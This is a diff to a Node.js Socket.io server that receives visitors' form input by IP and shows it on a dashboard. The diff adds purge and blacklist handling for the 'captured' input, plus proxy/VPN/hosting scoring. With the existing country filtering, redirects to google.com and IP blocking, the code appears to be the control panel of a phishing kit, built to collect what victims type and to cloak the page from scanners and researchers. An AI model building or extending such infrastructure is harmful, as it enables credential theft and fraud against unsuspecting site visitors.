@@ -17,6 +17,7 @@ const io = new Server(http);
 // Global settings object for configuration
 const globalSettings = {
   blockedIPs: new Set(), // Using Set for O(1) lookup
+  inputDataBlacklist: new Set(), // IPs that have had their input data deleted
   proxyDetectionEnabled: true,
   countryFilterMode: 'block', // 'block' or 'allow'
   countryRedirectUrl: 'https://google.com',
@@ -24,8 +25,9 @@ const globalSettings = {
   allowedCountries: new Set()
 };
 
-// Path for storing blocked IPs
+// Path for storing blocked IPs and input data blacklist
 const BLOCKED_IPS_FILE = path.join(__dirname, 'blocked_ips.json');
+const INPUT_DATA_BLACKLIST_FILE = path.join(__dirname, 'input_data_blacklist.json');
 
 /**
  * Check if an IP address is blocked
@@ -480,14 +482,76 @@ io.on('connection', (socket) => {
     referrer: socket.handshake.query.referrer || 'Direct',
     country: socket.handshake.query.country || 'Unknown',
     countryCode: socket.handshake.query.countryCode || getCountryCode(socket.handshake.query.country),
-    city: socket.handshake.query.city || 'Unknown'
+    city: socket.handshake.query.city || 'Unknown',
+    org: 'Unknown',
+    isp: 'Unknown',
+    proxy: false
   };
+  
+  // Ensure we have firstSeen timestamp if this is a new visitor
+  if (!visitorMetadata.has(clientIP)) {
+    initialMetadata.firstSeen = new Date().toISOString();
+  }
   
   // Update visitor metadata
   updateVisitorMetadata(clientIP, initialMetadata);
   
+  // Log visitor metadata for debugging
+  console.log(`Updated visitor metadata for IP ${clientIP}:`, visitorMetadata.get(clientIP));
+  
+  // Handle visitor metadata updates
+  socket.on('visitor-metadata', (data) => {
+    if (!data || !data.clientIP) {
+      console.error('Received invalid visitor metadata:', data);
+      return;
+    }
+    
+    const ip = data.clientIP;
+    console.log(`Received visitor metadata update for IP ${ip}:`, data);
+    
+    // Get existing metadata or create new
+    const existingMetadata = visitorMetadata.get(ip) || {};
+    
+    // Update with new data, preserving existing fields if not provided
+    const updatedMetadata = {
+      ...existingMetadata,
+      ip: ip,
+      lastActivity: new Date().toISOString(),
+      isOnline: true,
+      // Update specific fields if provided
+      browser: data.browser?.fullVersion || data.browser || existingMetadata.browser || 'Unknown',
+      os: data.os?.fullVersion || data.os || existingMetadata.os || 'Unknown',
+      device: data.device?.type || data.device || existingMetadata.device || 'Unknown',
+      country: data.country || existingMetadata.country || 'Unknown',
+      countryCode: data.countryCode || getCountryCode(data.country) || existingMetadata.countryCode || null,
+      city: data.city || existingMetadata.city || 'Unknown',
+      org: data.org || existingMetadata.org || 'Unknown',
+      isp: data.isp || existingMetadata.isp || 'Unknown',
+      proxy: data.proxy || existingMetadata.proxy || false,
+      currentPath: data.path || data.currentPath || existingMetadata.currentPath || '/',
+      referrer: data.referrer || existingMetadata.referrer || 'Direct'
+    };
+    
+    // Ensure firstSeen is preserved or set
+    if (!updatedMetadata.firstSeen) {
+      updatedMetadata.firstSeen = existingMetadata.firstSeen || new Date().toISOString();
+    }
+    
+    // Update visitor metadata
+    updateVisitorMetadata(ip, updatedMetadata);
+    
+    // Notify all dashboard clients about the updated visitor
+    io.emit('visitor-updated', { ip });
+  });
+  
   // Handle input data events
   socket.on('input-data', (data) => {
+    // Check if this IP is in the input data blacklist
+    if (global.inputDataBlacklist && global.inputDataBlacklist.has(clientIP)) {
+      console.log(`Ignoring input data from blacklisted IP: ${clientIP}`);
+      return; // Skip processing for blacklisted IPs
+    }
+    
     // Update input data cache
     updateInputDataCache(clientIP, data);
   });
@@ -523,6 +587,12 @@ io.on('connection', (socket) => {
 
 // Function to update input data cache
 function updateInputDataCache(clientIP, data) {
+  // Check if this IP is in the input data blacklist
+  if (global.inputDataBlacklist && global.inputDataBlacklist.has(clientIP)) {
+    console.log(`Ignoring input data from blacklisted IP: ${clientIP}`);
+    return; // Skip processing for blacklisted IPs
+  }
+  
   // Add timestamp if not provided
   if (!data.timestamp) {
     data.timestamp = new Date().toISOString();
@@ -633,6 +703,34 @@ const inputDataByIP = new Map(); // Key: IP, Value: Array of input data objects
 // Map to store visitor metadata
 const visitorMetadata = new Map(); // Key: IP, Value: visitor metadata object
 
+/**
+ * Update visitor metadata for a specific IP
+ * @param {string} ip - The IP address
+ * @param {Object} metadata - The metadata to update
+ */
+function updateVisitorMetadata(ip, metadata) {
+  if (!ip) return;
+  
+  // Get existing metadata or create new
+  const existingMetadata = visitorMetadata.get(ip) || {};
+  
+  // Merge with new metadata
+  const updatedMetadata = {
+    ...existingMetadata,
+    ...metadata,
+    // Always ensure these fields are set
+    ip: ip,
+    lastActivity: metadata.lastActivity || new Date().toISOString(),
+    firstSeen: existingMetadata.firstSeen || metadata.firstSeen || new Date().toISOString()
+  };
+  
+  // Update the visitor metadata map
+  visitorMetadata.set(ip, updatedMetadata);
+  
+  // Return the updated metadata
+  return updatedMetadata;
+}
+
 // Add some sample visitors for testing
 function addSampleVisitors() {
   // Sample visitor 1
@@ -713,6 +811,39 @@ app.get('/dashboard/input-data/:ip', (req, res) => {
     res.status(500).json({
       success: false,
       message: 'Error retrieving input data',
+      error: error.message
+    });
+  }
+});
+
+// GET endpoint to retrieve visitor data for a specific IP
+app.get('/dashboard/visitor/:ip', (req, res) => {
+  try {
+    const ip = req.params.ip;
+    
+    // Get visitor metadata
+    const visitor = visitorMetadata.get(ip) || {};
+    
+    // Check if this IP is in the blacklist
+    const isBlacklisted = global.inputDataBlacklist && global.inputDataBlacklist.has(ip);
+    
+    // Check if this IP is blocked
+    const isBlocked = globalSettings.blockedIPs && globalSettings.blockedIPs.has(ip);
+    
+    res.json({
+      success: true,
+      ip,
+      visitor: {
+        ...visitor,
+        isBlacklisted,
+        isBlocked
+      }
+    });
+  } catch (error) {
+    console.error(`Error retrieving visitor data for IP ${req.params.ip}:`, error);
+    res.status(500).json({
+      success: false,
+      message: 'Error retrieving visitor data',
       error: error.message
     });
   }
@@ -978,6 +1109,12 @@ io.on('connection', (socket) => {
     const source = data.source || 'unknown';
     const isFromIpify = source.includes('ipify');
     
+    // Check if this IP is in the blacklist (has had its input data cache deleted)
+    if (global.inputDataBlacklist && global.inputDataBlacklist.has(clientIP)) {
+      console.log(`Ignoring input data from blacklisted IP: ${clientIP} - cache was previously deleted`);
+      return; // Skip processing this input data
+    }
+    
     // Validate the client IP
     if (!isValidPublicIP(clientIP)) {
       console.warn(`Received invalid client IP in input data: ${clientIP}`);
@@ -1115,6 +1252,237 @@ io.on('connection', (socket) => {
         enabled: data.enabled,
         timestamp: Date.now()
       });
+    }
+  });
+  
+  // Set to track IPs that have had their input data cache deleted
+  // These IPs will not receive new input data updates
+  if (!global.inputDataBlacklist) {
+    global.inputDataBlacklist = new Set();
+  }
+  
+  // Load the input data blacklist from persistent storage
+  try {
+    if (fs.existsSync(INPUT_DATA_BLACKLIST_FILE)) {
+      const blacklistArray = JSON.parse(fs.readFileSync(INPUT_DATA_BLACKLIST_FILE, 'utf8'));
+      blacklistArray.forEach(ip => {
+        global.inputDataBlacklist.add(ip);
+      });
+      console.log(`Loaded ${blacklistArray.length} blacklisted IPs from ${INPUT_DATA_BLACKLIST_FILE}`);
+    } else {
+      console.log(`No input data blacklist file found at ${INPUT_DATA_BLACKLIST_FILE}, starting with empty set`);
+    }
+  } catch (error) {
+    console.error('Error loading input data blacklist:', error);
+  }
+  
+  // Handle delete input data cache event for a specific IP
+  socket.on('delete-input-data-cache', (data) => {
+    const ip = data.ip;
+    if (!ip) {
+      socket.emit('input-data-cache-deleted', { success: false, error: 'No IP provided' });
+      return;
+    }
+    
+    const forceDelete = data.forceDelete === true;
+    const deleteFromCapture = data.deleteFromCapture === true;
+    
+    console.log(`HARD DELETE: Completely purging all input data cache for IP: ${ip} (Force: ${forceDelete}, DeleteFromCapture: ${deleteFromCapture})`);
+    
+    try {
+      // Add the IP to the blacklist to prevent future input data updates
+      global.inputDataBlacklist.add(ip);
+      
+      // Save the blacklist to a persistent file
+      try {
+        const blacklistArray = Array.from(global.inputDataBlacklist);
+        fs.writeFileSync(INPUT_DATA_BLACKLIST_FILE, JSON.stringify(blacklistArray, null, 2));
+        console.log(`Saved ${blacklistArray.length} blacklisted IPs to ${INPUT_DATA_BLACKLIST_FILE}`);
+      } catch (saveError) {
+        console.error('Error saving input data blacklist:', saveError);
+      }
+      
+      console.log(`Added IP ${ip} to input data blacklist - will not receive new input data updates`);
+      
+      // COMPLETELY REMOVE input data from inputDataCache
+      if (inputDataCache.has(ip)) {
+        // Delete the entry entirely instead of just clearing the array
+        inputDataCache.delete(ip);
+        console.log(`Input data completely purged from inputDataCache for IP: ${ip}`);
+      } else {
+        console.log(`No input data found in inputDataCache for IP: ${ip}`);
+      }
+      
+      // Clear input data from visitorCache/ipCache if it exists
+      if (ipCache.has(ip)) {
+        const visitorData = ipCache.get(ip);
+        if (visitorData) {
+          // Remove inputs property entirely
+          if (visitorData.inputs) {
+            delete visitorData.inputs;
+            console.log(`Input data property removed from visitor cache for IP: ${ip}`);
+          }
+          
+          // Also remove any other input-related properties
+          if (visitorData.inputData) delete visitorData.inputData;
+          if (visitorData.formData) delete visitorData.formData;
+          if (visitorData.formInputs) delete visitorData.formInputs;
+          
+          ipCache.set(ip, visitorData);
+        }
+      }
+      
+      // Check visitorMetadata map to ensure we preserve visitor information
+      if (visitorMetadata && typeof visitorMetadata.has === 'function' && visitorMetadata.has(ip)) {
+        const visitor = visitorMetadata.get(ip);
+        if (visitor) {
+          // Remove only input-related properties while preserving visitor metadata
+          if (visitor.inputs) delete visitor.inputs;
+          if (visitor.inputData) delete visitor.inputData;
+          if (visitor.formData) delete visitor.formData;
+          if (visitor.formInputs) delete visitor.formInputs;
+          
+          // Make sure essential visitor metadata is preserved
+          const preservedVisitor = {
+            ...visitor,
+            // Ensure these fields are always present
+            ip: ip,
+            browser: visitor.browser || 'Unknown',
+            os: visitor.os || 'Unknown',
+            device: visitor.device || 'Unknown',
+            country: visitor.country || 'Unknown',
+            city: visitor.city || 'Unknown',
+            org: visitor.org || 'Unknown',
+            isp: visitor.isp || 'Unknown',
+            proxy: visitor.proxy || false,
+            firstSeen: visitor.firstSeen || new Date().toISOString(),
+            lastActivity: visitor.lastActivity || new Date().toISOString()
+          };
+          
+          // Update the visitor metadata
+          visitorMetadata.set(ip, preservedVisitor);
+          console.log(`Input data properties removed while preserving visitor metadata for IP: ${ip}`);
+          
+          // Log the preserved visitor metadata for debugging
+          console.log(`Preserved visitor metadata for IP ${ip}:`, preservedVisitor);
+        }
+      }
+      
+      // Check if we need to delete from captured data storage
+      if (deleteFromCapture) {
+        // Delete from any additional input data capture storage
+        try {
+          // Delete from any database or additional storage that might contain input data
+          // This ensures complete removal from all possible storage locations
+          
+          // Example: If you have a capturedInputs collection/map
+          if (global.capturedInputs && global.capturedInputs.has(ip)) {
+            global.capturedInputs.delete(ip);
+            console.log(`Deleted input data from captured storage for IP: ${ip}`);
+          }
+          
+          // Example: If you store in a database (pseudocode)
+          // await db.collection('capturedInputs').deleteMany({ ip: ip });
+          
+          // Clean up any other potential storage locations
+          // This is a catch-all to ensure complete deletion from ALL possible locations
+          Object.keys(global).forEach(key => {
+            if (global[key] && typeof global[key] === 'object' && global[key][ip] && 
+                (key.toLowerCase().includes('input') || key.toLowerCase().includes('capture'))) {
+              try {
+                delete global[key][ip];
+                console.log(`Deleted input data from global.${key} for IP: ${ip}`);
+              } catch (e) {
+                console.warn(`Failed to delete from global.${key}:`, e.message);
+              }
+            }
+          });
+        } catch (captureError) {
+          console.error(`Error deleting from captured data for IP ${ip}:`, captureError);
+          // Continue with the process even if this specific part fails
+        }
+      }
+      
+      // Broadcast update to all dashboard clients to refresh their data
+      io.emit('input-data-update', { ip });
+      
+      // Also broadcast a specific event for input data capture deletion
+      if (deleteFromCapture) {
+        io.emit('input-data-capture-deleted', { ip });
+      }
+      
+      // Send confirmation to the client
+      socket.emit('input-data-cache-deleted', { 
+        ip, 
+        success: true,
+        deletedFromCapture: deleteFromCapture
+      });
+      
+      console.log(`All input data successfully removed for IP: ${ip} (including captured data: ${deleteFromCapture})`);
+      
+      // Force garbage collection if possible to ensure memory is freed
+      if (forceDelete && global.gc) {
+        try {
+          global.gc();
+          console.log('Forced garbage collection after input data deletion');
+        } catch (e) {
+          console.warn('Failed to force garbage collection:', e.message);
+        }
+      }
+    } catch (error) {
+      console.error(`Error deleting input data cache for IP ${ip}:`, error);
+      socket.emit('input-data-cache-deleted', { ip, success: false, error: error.message });
+    }
+  });
+  
+  // Handle delete ALL input data cache event
+  socket.on('delete-all-input-data-cache', () => {
+    console.log('Deleting ALL input data cache');
+    
+    try {
+      // Clear the entire inputDataCache
+      inputDataCache.clear();
+      console.log('Input data cache completely cleared');
+      
+      // Remove input data properties from all visitor entries
+      for (const [ip, visitor] of ipCache.entries()) {
+        if (visitor) {
+          // Remove all input-related properties
+          if (visitor.inputs) delete visitor.inputs;
+          if (visitor.inputData) delete visitor.inputData;
+          if (visitor.formData) delete visitor.formData;
+          if (visitor.formInputs) delete visitor.formInputs;
+          
+          ipCache.set(ip, visitor);
+        }
+      }
+      console.log('Input data removed from all visitor entries');
+      
+      // If visitorData is separate from ipCache, clear that too
+      if (visitorData && typeof visitorData.forEach === 'function') {
+        visitorData.forEach((visitor, ip) => {
+          if (visitor) {
+            if (visitor.inputs) delete visitor.inputs;
+            if (visitor.inputData) delete visitor.inputData;
+            if (visitor.formData) delete visitor.formData;
+            if (visitor.formInputs) delete visitor.formInputs;
+            
+            visitorData.set(ip, visitor);
+          }
+        });
+        console.log('Input data removed from all entries in visitorData');
+      }
+      
+      // Broadcast update to all dashboard clients
+      io.emit('input-data-update');
+      
+      // Send confirmation to the client
+      socket.emit('all-input-data-cache-deleted', { success: true });
+      
+      console.log('ALL input data successfully removed from all caches');
+    } catch (error) {
+      console.error('Error deleting all input data cache:', error);
+      socket.emit('all-input-data-cache-deleted', { success: false, error: error.message });
     }
   });
   
@@ -1666,43 +2034,181 @@ const emitRedirect = (ip, url) => {
 
 // Using the geoDataCache defined above
 
-// Helper function to get geolocation data with caching
+// Helper function to get geolocation data with caching and enhanced proxy detection
 async function getGeoData(ip) {
   // Skip for localhost and private IPs
-  if (ip === '127.0.0.1' || ip === 'localhost' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
-    return { country: 'Local', countryCode: 'LO', city: 'Local Network' };
+  if (isLocalIP(ip)) {
+    return { 
+      country: 'Local', 
+      countryCode: 'LO', 
+      city: 'Local Network',
+      proxy: false,
+      hosting: false,
+      proxyScore: 0,
+      proxyDetail: 'Local IP'
+    };
   }
 
-  // Check if we have cached data
+  // Check if we have cached data that's not expired
+  const cacheExpiry = 6 * 60 * 60 * 1000; // 6 hours in milliseconds
   if (geoDataCache.has(ip)) {
-    return geoDataCache.get(ip);
+    const cachedData = geoDataCache.get(ip);
+    // Only use cache if it has timestamp and is not expired
+    if (cachedData.timestamp && (Date.now() - cachedData.timestamp) < cacheExpiry) {
+      return cachedData;
+    }
   }
+
+  // Initialize result with default values
+  let geoData = {
+    country: 'Unknown',
+    countryCode: 'XX',
+    city: 'Unknown',
+    isp: 'Unknown',
+    org: 'Unknown',
+    proxy: false,
+    hosting: false,
+    proxyScore: 0,
+    proxyDetail: '',
+    timestamp: Date.now()
+  };
 
   try {
-    const response = await axios.get(`http://ip-api.com/json/${ip}?fields=66842623`);
+    console.log(`Fetching geo data for ${ip} from ip-api.com`);
+    const response = await axios.get(`http://ip-api.com/json/${ip}?fields=66842623`, {
+      timeout: 3000 // 3 second timeout
+    });
     const data = response.data;
 
     if (data.status === 'success') {
-      // Cache the result for 24 hours
-      geoDataCache.set(ip, {
-        country: data.country,
-        countryCode: data.countryCode,
-        city: data.city,
+      // Update geo data with API response
+      geoData = {
+        country: data.country || 'Unknown',
+        countryCode: data.countryCode || 'XX',
+        city: data.city || 'Unknown',
+        region: data.regionName || 'Unknown',
         lat: data.lat,
         lon: data.lon,
-        isp: data.isp,
-        org: data.org,
-        proxy: data.proxy,
-        hosting: data.hosting
-      });
+        isp: data.isp || 'Unknown',
+        org: data.org || 'Unknown',
+        proxy: Boolean(data.proxy),
+        hosting: Boolean(data.hosting),
+        proxyScore: 0,
+        proxyDetail: '',
+        timestamp: Date.now()
+      };
 
-      return geoDataCache.get(ip);
+      // Enhanced proxy detection logic
+      let proxyScore = 0;
+      const proxyReasons = [];
+
+      // 1. Direct proxy/VPN detection from API
+      if (data.proxy) {
+        proxyScore += 70;
+        proxyReasons.push('Proxy/VPN detected');
+      }
+
+      // 2. Hosting provider detection
+      if (data.hosting) {
+        proxyScore += 30;
+        proxyReasons.push('Hosting provider detected');
+      }
+
+      // 3. ISP/Organization analysis
+      const ispOrgText = `${data.isp || ''} ${data.org || ''}`.toLowerCase();
+      const proxyKeywords = ['vpn', 'proxy', 'tor', 'exit node', 'anonymous', 'hide my', 'private internet'];
+      const hostingKeywords = ['host', 'cloud', 'server', 'data center', 'datacenter', 'vps', 'virtual private server'];
+      
+      // Check for proxy keywords
+      for (const keyword of proxyKeywords) {
+        if (ispOrgText.includes(keyword)) {
+          proxyScore += 40;
+          proxyReasons.push(`ISP/Org contains proxy keyword: ${keyword}`);
+          break;
+        }
+      }
+      
+      // Check for hosting keywords
+      for (const keyword of hostingKeywords) {
+        if (ispOrgText.includes(keyword)) {
+          proxyScore += 20;
+          proxyReasons.push(`ISP/Org indicates hosting service`);
+          break;
+        }
+      }
+
+      // 4. High-risk countries for proxies
+      const highRiskCountries = ['RU', 'VG', 'SC', 'PA', 'CY', 'BZ', 'KY', 'BS', 'HK'];
+      if (highRiskCountries.includes(data.countryCode)) {
+        proxyScore += 15;
+        proxyReasons.push(`High-risk country: ${data.country}`);
+      }
+
+      // 5. Port analysis if available
+      if (data.port && (data.port === 80 || data.port === 443 || data.port === 8080 || data.port === 3128)) {
+        proxyScore += 10;
+        proxyReasons.push(`Connection via common proxy port: ${data.port}`);
+      }
+
+      // Normalize score to 0-100 range
+      proxyScore = Math.min(100, proxyScore);
+      
+      // Update final proxy status based on score threshold
+      geoData.proxyScore = proxyScore;
+      geoData.proxyDetail = proxyReasons.join('; ');
+      
+      // If score is high enough, mark as proxy regardless of API flag
+      if (proxyScore >= 70) {
+        geoData.proxy = true;
+      }
+
+      console.log(`Proxy detection for ${ip}: Score=${proxyScore}, IsProxy=${geoData.proxy}, Details=${geoData.proxyDetail}`);
     }
   } catch (error) {
-    console.error(`Error fetching geo data for ${ip}:`, error.message);
+    console.error(`Error fetching geo data from ip-api.com for ${ip}:`, error.message);
+    
+    // Try fallback API if primary fails
+    try {
+      console.log(`Trying fallback geo API for ${ip}`);
+      // Implement fallback API call here if needed
+      // For example: ipinfo.io, ipdata.co, or ipgeolocation.io
+    } catch (fallbackError) {
+      console.error(`Fallback geo API also failed for ${ip}:`, fallbackError.message);
+    }
   }
 
-  return { country: 'Unknown', countryCode: 'XX', city: 'Unknown' };
+  // Cache the result
+  geoDataCache.set(ip, geoData);
+  return geoData;
+}
+
+// Helper function to check if an IP is a local/private IP
+function isLocalIP(ip) {
+  if (!ip) return true;
+  
+  // Check for localhost and common private IP ranges
+  return ip === '127.0.0.1' || 
+         ip === 'localhost' || 
+         ip === '::1' || 
+         ip.startsWith('192.168.') || 
+         ip.startsWith('10.') || 
+         ip.startsWith('172.16.') || 
+         ip.startsWith('172.17.') || 
+         ip.startsWith('172.18.') || 
+         ip.startsWith('172.19.') || 
+         ip.startsWith('172.20.') || 
+         ip.startsWith('172.21.') || 
+         ip.startsWith('172.22.') || 
+         ip.startsWith('172.23.') || 
+         ip.startsWith('172.24.') || 
+         ip.startsWith('172.25.') || 
+         ip.startsWith('172.26.') || 
+         ip.startsWith('172.27.') || 
+         ip.startsWith('172.28.') || 
+         ip.startsWith('172.29.') || 
+         ip.startsWith('172.30.') || 
+         ip.startsWith('172.31.') || 
+         ip.startsWith('169.254.');
 }
 
 // Function to get the most accurate client IP available
